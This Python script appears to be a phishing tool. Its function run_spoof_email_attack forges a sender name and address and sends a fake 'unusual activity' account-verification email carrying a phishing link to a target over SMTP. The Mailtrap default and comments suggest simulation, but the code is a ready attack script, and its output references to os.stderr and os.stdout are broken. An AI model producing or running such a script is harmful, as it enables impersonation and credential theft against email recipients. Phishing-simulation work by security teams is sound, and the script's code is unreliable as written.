import os
import smtplib
from email.mime.text import MIMEText
from email.header import Header
import json

def run_spoof_email_attack():
    target_email = os.environ.get("TARGET_EMAIL")
    phishing_url = os.environ.get("PHISHING_URL")
    from_address = os.environ.get("FROM_ADDRESS")
    from_name = os.environ.get("FROM_NAME", "Admin")
    subject = os.environ.get("SUBJECT")
    body_template = os.environ.get("BODY_TEMPLATE") # e.g.,


"template_1.html"

    if not all([target_email, phishing_url, from_address, subject, body_template]):
        print(json.dumps({"status": "failed", "message": "Missing required environment variables."}), file=os.stderr)
        exit(1)

    # In a real scenario, you'd load body_template content from a file or database
    # For this example, we'll use a simple placeholder
    email_body = f"""
    Dear User,

    We have detected unusual activity on your account. Please click the link below to verify your details:

    {phishing_url}

    Sincerely,
    {from_name}
    """

    msg = MIMEText(email_body, "html", "utf-8")
    msg["From"] = str(Header(f"{from_name} <{from_address}>", "utf-8"))
    msg["To"] = target_email
    msg["Subject"] = Header(subject, "utf-8")

    try:
        # This would typically be an SMTP server you control or a mail relay service
        # For simulation, you might use a mock SMTP server or a test service like Mailtrap
        # Using a dummy SMTP server for demonstration
        smtp_server = os.environ.get("SMTP_SERVER", "smtp.mailtrap.io")
        smtp_port = int(os.environ.get("SMTP_PORT", 2525))
        smtp_username = os.environ.get("SMTP_USERNAME", "your_mailtrap_username")
        smtp_password = os.environ.get("SMTP_PASSWORD", "your_mailtrap_password")

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls() # Use TLS
            server.login(smtp_username, smtp_password)
            server.send_message(msg)

        print(json.dumps({"status": "success", "message": f"Phishing email sent to {target_email}"}), file=os.stdout)

    except Exception as e:
        print(json.dumps({"status": "failed", "message": f"Failed to send email: {str(e)}"}), file=os.stderr)
        exit(1)

if __name__ == "__main__":
    run_spoof_email_attack()